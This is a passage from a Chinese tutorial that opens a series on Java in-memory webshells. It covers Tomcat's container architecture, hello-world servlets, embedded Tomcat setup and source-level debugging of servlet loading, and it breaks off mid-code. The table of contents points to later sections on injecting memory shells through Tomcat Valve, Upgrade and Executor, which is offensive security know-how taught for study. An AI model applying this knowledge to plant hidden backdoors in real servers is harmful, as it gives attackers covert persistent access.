<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="c9fe7b31ea4d3585de3da013cfe7013c">一、前言</h1>
<p>之前写的零基础学<code>Fastjson</code>的文章反向很不错，很多师傅在公众号后台和我的微信私聊我表示感谢，其实也没啥，大家都是零基础过来的。网上的文章多而杂，并且只有少部分文章是配图清楚、文字描述清晰的，很多时候新手学着学着可能就因为作者的某一个地方没有描述清楚而不知其所指，非常痛苦；亦或是文章面向对象不同，前置知识不扎实导致很多东西无法理解，这些痛点我都曾经历过。但是随着看过的代码逐渐增多，见识逐渐丰富，调试的次数越多，对各种问题的处理就会越得心应手。</p>
<p>本文所讨论的<code>Java</code>内存马是<code>Java</code>安全中的一个不可或缺的板块，它内容丰富绮丽，研究起来让人着迷，沉沦其中流连忘返。我参考了<code>su18</code>师傅一年多以前发表在<code>Goby</code>社区的这篇文章（<code>https://nosec.org/home/detail/5049.html</code>）中给出的分类方式，把整个零基础掌握<code>java</code>内存马系列分成了以下几个部分：传统<code>web</code>型、<code>spring</code>系列框架型、中间件型、其他内存马（<code>Websocket/Jsp/线程型/RMI</code>）、<code>Agent</code>型内存马、实战内存马打入（<code>Jetty</code>/<code>Weblogic</code>/<code>Shiro</code>/<code>Struts2</code>/<code>GlassFish</code>/<code>xxl-job</code>...）和内存马查杀。<br/>
本篇为上篇，上篇截止至【中间件型内存马】，下篇年后再写，最近太累了。<br/>
由于先知社区发文字数限制，因此文章分为三部分发出来。<br/>
文章完整版已开源至<code>Github</code>，觉得写的不错的话就给个<code>star</code>吧~：</p>
<blockquote>
<p><a href="https://github.com/W01fh4cker/LearnJavaMemshellFromZero" target="_blank">https://github.com/W01fh4cker/LearnJavaMemshellFromZero</a></p>
</blockquote>
<p>上篇的目录：</p>
<ul>
<li><a href="#一前言" target="_blank">一、前言</a></li>
<li>
<a href="#二前置知识" target="_blank">二、前置知识</a><ul>
<li><a href="#21-servlet容器与enginehostcontext和wrapper" target="_blank">2.1 Servlet容器与Engine、Host、Context和Wrapper</a></li>
<li><a href="#22-编写一个简单的servlet" target="_blank">2.2 编写一个简单的servlet</a></li>
<li>
<a href="#23-从代码层面看servlet初始化与装载流程" target="_blank">2.3 从代码层面看servlet初始化与装载流程</a><ul>
<li><a href="#231-servlet初始化流程分析" target="_blank">2.3.1 servlet初始化流程分析</a></li>
<li><a href="#232-servlet装载流程分析" target="_blank">2.3.2 servlet装载流程分析</a></li>
</ul>
</li>
<li><a href="#24-filter容器与filterdefsfilterconfigsfiltermapsfilterchain" target="_blank">2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain</a></li>
<li><a href="#25-编写一个简单的filter" target="_blank">2.5 编写一个简单的Filter</a></li>
<li><a href="#26-从代码层面分析filter运行的整体流程" target="_blank">2.6 从代码层面分析Filter运行的整体流程</a></li>
<li><a href="#27-listener简单介绍" target="_blank">2.7 Listener简单介绍</a></li>
<li><a href="#28-编写一个简单的listenerservletrequestlistener" target="_blank">2.8 编写一个简单的Listener（ServletRequestListener）</a></li>
<li><a href="#29-从代码层面分析listener运行的整体流程" target="_blank">2.9 从代码层面分析Listener运行的整体流程</a></li>
<li>
<a href="#210-简单的spring项目搭建" target="_blank">2.10 简单的spring项目搭建</a><ul>
<li><a href="#2101-编写一个简单的spring-controller" target="_blank">2.10.1 编写一个简单的Spring Controller</a></li>
<li><a href="#2102-编写一个简单的spring-interceptor" target="_blank">2.10.2 编写一个简单的Spring Interceptor</a></li>
<li><a href="#2103-编写一个简单的spring-webflux的demo基于netty" target="_blank">2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty）</a></li>
</ul>
</li>
<li>
<a href="#211-spring-mvc介绍" target="_blank">2.11 Spring MVC介绍</a><ul>
<li><a href="#2111-spring-mvc九大组件" target="_blank">2.11.1 Spring MVC九大组件</a></li>
<li>
<a href="#2112-简单的源码分析" target="_blank">2.11.2 简单的源码分析</a><ul>
<li><a href="#21121-九大组件的初始化" target="_blank">2.11.2.1 九大组件的初始化</a></li>
<li><a href="#21122-url和controller的关系的建立" target="_blank">2.11.2.2 url和Controller的关系的建立</a></li>
<li><a href="#21123-spring-interceptor引入与执行流程分析" target="_blank">2.11.2.3 Spring Interceptor引入与执行流程分析</a></li>
</ul>
</li>
</ul>
</li>
<li>
<a href="#212-spring-webflux介绍与代码调试分析" target="_blank">2.12 Spring WebFlux介绍与代码调试分析</a><ul>
<li><a href="#2121-什么是mono" target="_blank">2.12.1 什么是Mono？</a></li>
<li><a href="#2122-什么是flux" target="_blank">2.12.2 什么是Flux？</a></li>
<li><a href="#2123-spring-webflux启动过程分析" target="_blank">2.12.3 Spring WebFlux启动过程分析</a></li>
<li><a href="#2124-spring-webflux请求处理过程分析" target="_blank">2.12.4 Spring WebFlux请求处理过程分析</a></li>
<li><a href="#2125-spring-webflux过滤器webfilter运行过程分析" target="_blank">2.12.5 Spring WebFlux过滤器WebFilter运行过程分析</a></li>
</ul>
</li>
<li>
<a href="#213-tomcat-valve介绍与运行过程分析" target="_blank">2.13 Tomcat Valve介绍与运行过程分析</a><ul>
<li><a href="#2131-valve与pipeline" target="_blank">2.13.1 Valve与Pipeline</a></li>
<li><a href="#2132-编写一个简单tomcat-valve的demo" target="_blank">2.13.2 编写一个简单Tomcat Valve的demo</a></li>
<li><a href="#2133-tomcat-valve打入内存马思路分析" target="_blank">2.13.3 Tomcat Valve打入内存马思路分析</a></li>
</ul>
</li>
<li>
<a href="#214-tomcat-upgrade介绍与打入内存马思路分析" target="_blank">2.14 Tomcat Upgrade介绍与打入内存马思路分析</a><ul>
<li>
<a href="#2141-编写一个简单的tomcat-upgrade的demo" target="_blank">2.14.1 编写一个简单的Tomcat Upgrade的demo</a><ul>
<li><a href="#21411-利用springboot搭建" target="_blank">2.14.1.1 利用SpringBoot搭建</a></li>
<li><a href="#21412-利用tomcat搭建" target="_blank">2.14.1.2 利用Tomcat搭建</a></li>
</ul>
</li>
<li><a href="#2142-tomcat-upgrade内存马介绍与相关代码调试分析" target="_blank">2.14.2 Tomcat Upgrade内存马介绍与相关代码调试分析</a></li>
</ul>
</li>
<li>
<a href="#215-tomcat-executor内存马介绍与打入内存马思路分析" target="_blank">2.15 Tomcat Executor内存马介绍与打入内存马思路分析</a><ul>
<li><a href="#2151" target="_blank">2.15.1</a></li>
<li>
<a href="#2152-tomcat-executor内存马介绍与代码调试分析" target="_blank">2.15.2 Tomcat Executor内存马介绍与代码调试分析</a><ul>
<li><a href="#21521-endpoint五大组件" target="_blank">2.15.2.1 Endpoint五大组件</a></li>
<li><a href="#21522-endpoint分类" target="_blank">2.15.2.2 Endpoint分类</a></li>
<li><a href="#21523-executor相关代码分析" target="_blank">2.15.2.3 Executor相关代码分析</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>好了，让我们闲话少叙，就此开始我们的第一部分。</p>
<h1 data-content="1" id="dc9ae2af8de2f1dacb9857f60de4f1ef">二、前置知识</h1>
<p>本篇文章除特殊说明外，使用的是<code>jdk1.8.0_202</code>+ <code>tomcat 9.0.85</code>，后者下载地址为：</p>
<blockquote>
<p><a href="https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.85/bin/apache-tomcat-9.0.85-windows-x64.zip。" target="_blank">https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.85/bin/apache-tomcat-9.0.85-windows-x64.zip。</a></p>
</blockquote>
<h2 data-content="1" id="99b3dfcba69ed3156d3d77f70e6c3853">2.1 Servlet容器与Engine、Host、Context和Wrapper</h2>
<p>这部分我找了好久，终于在一大堆高深/垃圾的文章中邂逅了一篇写的还算简明扼要易于理解的文章。</p>
<blockquote>
<p>原文地址：<a href="https://www.maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li" target="_blank">https://www.maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li</a></p>
</blockquote>
<p>这里组合引用其原文，简单概括，就是：</p>
<p><code>Tomcat</code>设计了四种容器，分别是<code>Engine</code>、<code>Host</code>、<code>Context</code>和<code>Wrapper</code>，其关系如下：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001822-02f7220a-c830-1.jpeg"/></p>
<p>这一点可以从<code>Tomcat</code>的配置文件<code>server.xml</code>中看出来。</p>
<p>此时，设想这样一个场景：我们此时要访问<code>https://manage.xxx.com:8080/user/list</code>，那<code>tomcat</code>是如何实现请求定位到具体的<code>servlet</code>的呢？为此<code>tomcat</code>设计了<code>Mapper</code>，其中保存了容器组件与访问路径的映射关系。</p>
<p>然后就开始四步走：</p>
<ol>
<li>
<p>根据协议和端口号选定<code>Service</code>和<code>Engine</code>。</p>
<p>我们知道<code>Tomcat</code>的每个连接器都监听不同的端口，比如<code>Tomcat</code>默认的<code>HTTP</code>连接器监听<code>8080</code>端口、默认的<code>AJP</code>连接器监听<code>8009</code>端口。上面例子中的URL访问的是<code>8080</code>端口，因此这个请求会被<code>HTTP</code>连接器接收，而一个连接器是属于一个<code>Service</code>组件的，这样<code>Service</code>组件就确定了。我们还知道一个<code>Service</code>组件里除了有多个连接器，还有一个容器组件，具体来说就是一个<code>Engine</code>容器，因此<code>Service</code>确定了也就意味着<code>Engine</code>也确定了。</p>
</li>
<li>
<p>根据域名选定<code>Host</code>。</p>
<p><code>Service</code>和<code>Engine</code>确定后，<code>Mapper</code>组件通过<code>url</code>中的域名去查找相应的<code>Host</code>容器，比如例子中的<code>url</code>访问的域名是<code>manage.xxx.com</code>，因此<code>Mapper</code>会找到<code>Host1</code>这个容器。</p>
</li>
<li>
<p>根据<code>url</code>路径找到<code>Context</code>组件。</p>
<p><code>Host</code>确定以后，<code>Mapper</code>根据<code>url</code>的路径来匹配相应的<code>Web</code>应用的路径，比如例子中访问的是<code>/user</code>，因此找到了<code>Context1</code>这个<code>Context</code>容器。</p>
</li>
<li>
<p>根据<code>url</code>路径找到<code>Wrapper</code>（<code>Servlet</code>）。</p>
<p><code>Context</code>确定后，<code>Mapper</code>再根据<code>web.xml</code>中配置的<code>Servlet</code>映射路径来找到具体的<code>Wrapper</code>和<code>Servlet</code>，例如这里的<code>Wrapper1</code>的<code>/list</code>。</p>
</li>
</ol>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001823-0344d126-c830-1.jpeg"/></p>
<p>这里的<code>Context</code>翻译过来就是上下文，它包括<code>servlet</code>运行的基本环境；这里的<code>Wrapper</code>翻译过来就是包装器，它负责管理一个<code>servlet</code>，包括其装载、初始化、执行和资源回收。</p>
<p>关于上图中的连接器的设计，可以继续参考该作者的博文：</p>
<blockquote>
<p><a href="https://www.maishuren.top/archives/yi-bu-bu-dai-ni-le-jie-tomcat-zhong-de-lian-jie-qi-shi-ru-he-she-ji-de" target="_blank">https://www.maishuren.top/archives/yi-bu-bu-dai-ni-le-jie-tomcat-zhong-de-lian-jie-qi-shi-ru-he-she-ji-de</a></p>
</blockquote>
<p>写到后面之后我又发现了一篇写的极佳的文章，贴在这儿供大家参考，讲的是关于<code>tomcat</code>架构的原理解析：</p>
<blockquote>
<p><a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09" target="_blank">https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09</a></p>
</blockquote>
<h2 data-content="1" id="c33de15a9739d6b21bed5880bcc520d4">2.2 编写一个简单的servlet</h2>
<p><code>pom.xml</code>文件如下：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;project</span> <span class="na">xmlns=</span><span class="s">"http://maven.apache.org/POM/4.0.0"</span>
         <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
         <span class="na">xsi:schemaLocation=</span><span class="s">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;modelVersion&gt;</span>4.0.0<span class="nt">&lt;/modelVersion&gt;</span>

    <span class="nt">&lt;groupId&gt;</span>org.example<span class="nt">&lt;/groupId&gt;</span>
    <span class="nt">&lt;artifactId&gt;</span>servletMemoryShell<span class="nt">&lt;/artifactId&gt;</span>
    <span class="nt">&lt;version&gt;</span>1.0-SNAPSHOT<span class="nt">&lt;/version&gt;</span>

    <span class="nt">&lt;properties&gt;</span>
        <span class="nt">&lt;maven.compiler.source&gt;</span>8<span class="nt">&lt;/maven.compiler.source&gt;</span>
        <span class="nt">&lt;maven.compiler.target&gt;</span>8<span class="nt">&lt;/maven.compiler.target&gt;</span>
        <span class="nt">&lt;project.build.sourceEncoding&gt;</span>UTF-8<span class="nt">&lt;/project.build.sourceEncoding&gt;</span>
    <span class="nt">&lt;/properties&gt;</span>

    <span class="nt">&lt;dependencies&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>javax.servlet<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>javax.servlet-api<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>4.0.1<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
    <span class="nt">&lt;/dependencies&gt;</span>

<span class="nt">&lt;/project&gt;</span>
</pre></div>
<p>同步下依赖：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001824-03cf3528-c830-1.jpeg"/></p>
<p><code>TestServlet.java</code>代码如下：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.annotation.WebServlet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServlet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>

<span class="nd">@WebServlet</span><span class="o">(</span><span class="s">"/test"</span><span class="o">)</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">TestServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">req</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">resp</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">resp</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"hello world"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>然后配置项目运行所需的<code>tomcat</code>环境：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001825-045637d0-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001826-04e6ec4e-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001826-054d0088-c830-1.jpeg"/></p>
<p>然后配置<code>artifacts</code>，直接点击<code>fix</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001827-05b1248c-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001828-0605d7ac-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001828-0664fd7c-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001829-06a8d402-c830-1.jpeg"/></p>
<p>然后添加<code>web</code>模块：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001829-070f37d8-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001830-077dfe5c-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001831-07f2e32a-c830-1.jpeg"/></p>
<p>运行之后，访问<a href="http://localhost:8080/testServlet/test：" target="_blank">http://localhost:8080/testServlet/test：</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001831-083098d2-c830-1.jpeg"/></p>
<h2 data-content="1" id="37f81a807bcc4ae41c4f8d65d1c30f87">2.3 从代码层面看servlet初始化与装载流程</h2>
<p>主要参考文章：</p>
<blockquote>
<p><a href="https://longlone.top/安全/java/java安全/内存马/Tomcat-Servlet型/" target="_blank">https://longlone.top/安全/java/java安全/内存马/Tomcat-Servlet型/</a></p>
</blockquote>
<p>我们这里不采用我们下载的<code>tomcat</code>来运行我们的项目，我们使用嵌入式<code>tomcat</code>也就是所谓的<code>tomcat-embed-core</code>。关于动态调试，我是图省事，直接用<code>tomcat-embed-core</code>，你当然也可以调试直接调试<code>tomcat</code>源码，环境搭建方法可以参考<code>Skay</code>师傅的文章：</p>
<blockquote>
<p><a href="https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw" target="_blank">https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw</a></p>
</blockquote>
<p>我们重开一个项目，文件代码如下：</p>
<p><code>pom.xml</code>：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;project</span> <span class="na">xmlns=</span><span class="s">"http://maven.apache.org/POM/4.0.0"</span>
         <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
         <span class="na">xsi:schemaLocation=</span><span class="s">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;modelVersion&gt;</span>4.0.0<span class="nt">&lt;/modelVersion&gt;</span>

    <span class="nt">&lt;groupId&gt;</span>org.example<span class="nt">&lt;/groupId&gt;</span>
    <span class="nt">&lt;artifactId&gt;</span>servletMemoryShell<span class="nt">&lt;/artifactId&gt;</span>
    <span class="nt">&lt;version&gt;</span>1.0-SNAPSHOT<span class="nt">&lt;/version&gt;</span>

    <span class="nt">&lt;properties&gt;</span>
        <span class="nt">&lt;maven.compiler.source&gt;</span>8<span class="nt">&lt;/maven.compiler.source&gt;</span>
        <span class="nt">&lt;maven.compiler.target&gt;</span>8<span class="nt">&lt;/maven.compiler.target&gt;</span>
        <span class="nt">&lt;project.build.sourceEncoding&gt;</span>UTF-8<span class="nt">&lt;/project.build.sourceEncoding&gt;</span>
    <span class="nt">&lt;/properties&gt;</span>

    <span class="nt">&lt;dependencies&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat.embed<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>tomcat-embed-core<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>9.0.83<span class="nt">&lt;/version&gt;</span>
            <span class="nt">&lt;scope&gt;</span>compile<span class="nt">&lt;/scope&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat.embed<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>tomcat-embed-jasper<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>9.0.83<span class="nt">&lt;/version&gt;</span>
            <span class="nt">&lt;scope&gt;</span>compile<span class="nt">&lt;/scope&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
    <span class="nt">&lt;/dependencies&gt;</span>

<span class="nt">&lt;/project&gt;</span>
</pre></div>
<p><code>Main.java</code>：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.catalina.Context</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.catalina.LifecycleException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.catalina.startup.Tomcat</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">LifecycleException</span> <span class="o">{</span>
        <span class="n">Tomcat</span> <span class="n">tomcat</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Tomcat</span><span class="o">();</span>
        <span class="n">tomcat</span><span class="o">.</span><span class="na">getConnector</span><span class="o">();</span> <span class="c1">//tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603</span>
        <span class="n">Context</span> <span class="n">context</span> <span class="o">=</span> <span class="n">tomcat</span><span class="o">.</span><span class="na">addWebapp</span><span class="o">(</span><span class="s">""</span><span class="o">,</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"."</span><span class="o">).</span><span class="na">getAbsolutePath</span><span class="o">());</span>
        <span class="n">Tomcat</span><span class="o">.</span><span class="na">addServlet</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="s">"helloServlet"</span><span class="o">,</span> <span class="k">new</span> <span class="n">HelloServlet</span><span class="o">());</span>
        <span class="n">context</span><span class="o">.</span><span class="na">addServletMappingDecoded</span><span class="o">(</span><span class="s">"/hello"</span><span class="o">,</span> <span class="s">"helloServlet"</span><span class="o">);</span>
        <span class="n">tomcat</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
        <span class="n">tomcat</span><span class="o">.</span><span class="na">getServer</span><span class="o">().</span><span class="na">await</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><code>HelloServlet.java</code>：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.servlet.ServletException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.annotation.WebServlet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServlet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.PrintWriter</span><span class="o">;</span>

<span class="nd">@WebServlet</span><span class="o">(</span><span class="s">"/hello"</span><span class="o">)</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">"text/html"</span><span class="o">);</span>
        <span class="n">PrintWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"&lt;html&gt;&lt;body&gt;"</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Hello, World!"</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"&lt;/body&gt;&lt;/html&gt;"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="ca85420ff6fbdf0c2d555d56420fa266">2.3.1 servlet初始化流程分析</h3>
<p>我们在<code>org.apache.catalina.core.StandardWrapper#setServletClass</code>处下断点调试：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001839-0cf9c15e-c830-1.jpeg"/></p>
<p>我们尝试按<code>Ctrl+左键</code>追踪它的上层调用位置，但是提示我们找不到，需要按两次<code>Ctrl+Alt+F7</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001909-1e87e540-c830-1.jpeg"/></p>
<p>然后就可以看到，上层调用位置位于<code>org.apache.catalina.startup.ContextConfig#configureContext</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001920-2519a150-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001921-25d81f54-c830-1.jpeg"/></p>
<p>接下来我们详细看下面这段代码：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001922-2686ac7c-c830-1.jpeg"/></p>
<div class="highlight"><pre><span></span><span class="k">for</span> <span class="o">(</span><span class="n">ServletDef</span> <span class="n">servlet</span> <span class="o">:</span> <span class="n">webxml</span><span class="o">.</span><span class="na">getServlets</span><span class="o">().</span><span class="na">values</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">Wrapper</span> <span class="n">wrapper</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">createWrapper</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getLoadOnStartup</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">wrapper</span><span class="o">.</span><span class="na">setLoadOnStartup</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getLoadOnStartup</span><span class="o">().</span><span class="na">intValue</span><span class="o">());</span>
            <span class="o">}</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getEnabled</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">wrapper</span><span class="o">.</span><span class="na">setEnabled</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getEnabled</span><span class="o">().</span><span class="na">booleanValue</span><span class="o">());</span>
            <span class="o">}</span>
            <span class="n">wrapper</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getServletName</span><span class="o">());</span>
            <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">params</span> <span class="o">=</span> <span class="n">servlet</span><span class="o">.</span><span class="na">getParameterMap</span><span class="o">();</span>
            <span class="k">for</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">:</span> <span class="n">params</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">wrapper</span><span class="o">.</span><span class="na">addInitParameter</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">(),</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
            <span class="o">}</span>
            <span class="n">wrapper</span><span class="o">.</span><span class="na">setRunAs</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getRunAs</span><span class="o">());</span>
            <span class="n">Set</span><span class="o">&lt;</span><span class="n">SecurityRoleRef</span><span class="o">&gt;</span> <span class="n">roleRefs</span> <span class="o">=</span> <span class="n">servlet</span><span class="o">.</span><span class="na">getSecurityRoleRefs</span><span class="o">();</span>
            <span class="k">for</span> <span class="o">(</span><span class="n">SecurityRoleRef</span> <span class="n">roleRef</span> <span class="o">:</span> <span class="n">roleRefs</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">wrapper</span><span class="o">.</span><span class="na">addSecurityReference</span><span class="o">(</span>
                        <span class="n">roleRef</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="n">roleRef</span><span class="o">.</span><span class="na">getLink</span><span class="o">());</span>
            <span class="o">}</span>
            <span class="n">wrapper</span><span class="o">.</span><span class="na">setServletClass</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getServletClass</span><span class="o">());</span>
            <span class="n">MultipartDef</span> <span class="n">multipartdef</span> <span class="o">=</span> <span class="n">servlet</span><span class="o">.</span><span class="na">getMultipartDef</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">multipartdef</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="kt">long</span> <span class="n">maxFileSize</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="o">;</span>
                <span class="kt">long</span> <span class="n">maxRequestSize</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="o">;</span>
                <span class="kt">int</span> <span class="n">fileSizeThreshold</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>

                <span class="k">if</span><span class="o">(</span><span class="kc">null</span> <span class="o">!=</span> <span class="n">multipartdef</span><span class="o">.</span><span class="na">getMaxFileSize</span><span class="o">())</span> <span class="o">{</span>
